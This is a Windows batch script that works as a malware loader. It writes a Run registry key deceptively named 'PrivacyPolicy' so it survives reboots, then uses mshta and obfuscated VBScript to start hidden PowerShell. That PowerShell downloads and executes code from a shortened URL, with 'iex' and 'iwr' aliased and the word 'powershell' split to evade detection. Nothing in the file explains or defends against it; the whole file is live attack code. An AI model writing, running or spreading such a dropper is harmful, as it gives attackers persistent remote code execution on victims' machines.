@echo off
setlocal
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v PrivacyPolicy /t REG_SZ /d "C:\Windows\system32\mshta.exe vbscript:Execute(\"Set ggg = CreateObject(\"\"WScript.Shell\"\") : appleseed = \"\"powe\"\" : ggg.Run appleseed+\"\"rshell -command sal binbo iex ; sal lim_par iwr ; binbo(lim_par tiny.cc/2lpg001)\"\", 0 : window.close\")"
C:\Windows\system32\mshta.exe vbscript:Execute("Set ggg = CreateObject(""WScript.Shell"") : appleseed = ""powe"" : ggg.Run appleseed+""rshell -command sal binbo iex ; sal lim_par iwr ; binbo(lim_par tiny.cc/2lpg001)"", 0 : window.close")
Exit